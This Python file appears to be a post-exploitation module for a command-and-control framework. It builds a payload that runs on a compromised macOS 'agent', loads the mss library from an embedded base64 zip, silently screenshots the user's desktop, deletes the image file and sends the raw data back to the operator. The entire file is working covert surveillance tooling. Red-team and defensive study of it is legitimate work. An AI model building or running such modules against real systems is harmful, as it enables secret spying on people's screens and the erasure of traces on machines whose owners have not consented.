import base64
import os

class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'NativeScreenshotMSS',

            # list of one or more authors for the module
            'Author': ['@xorrior'],

            # more verbose multi-line description of the module
            'Description': ('Takes a screenshot of an OSX desktop using the Python mss module. The python-mss module utilizes ctypes and the CoreFoundation library.'),

            # True if the module needs to run in the background
            'Background': False,

            # File extension to save the file as
            'OutputExtension': "png",

            # if the module needs administrative privileges
            'NeedsAdmin': False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe': False,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': []
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent': {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'SavePath': {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Monitor to obtain a screenshot. 0 represents all.',
                'Required'      :   True,
                'Value'         :   '/tmp/debug.png'
            },
            'Monitor': {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Monitor to obtain a screenshot. -1 represents all.',
                'Required'      :   True,
                'Value'         :   '-1'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        path = self.mainMenu.installPath + "data/misc/python_modules/mss.zip"
        filename = os.path.basename(path).rstrip('.zip')
        open_file = open(path, 'rb')
        module_data = open_file.read()
        open_file.close()
        module_data = base64.b64encode(module_data)
        script = """
import os
import base64
data = "%s"
def run(data):
    rawmodule = base64.b64decode(data)
    zf = zipfile.ZipFile(io.BytesIO(rawmodule), "r")
    if "mss" not in moduleRepo.keys():
        moduleRepo["mss"] = zf
        install_hook("mss")
    
    from mss import mss
    m = mss()
    file = m.shot(mon=%s,output='%s')
    raw = open(file, 'rb').read()
    run_command('rm -f %%s' %% (file))
    print raw

run(data)
""" % (module_data, self.options['Monitor']['Value'], self.options['SavePath']['Value'])

        return script
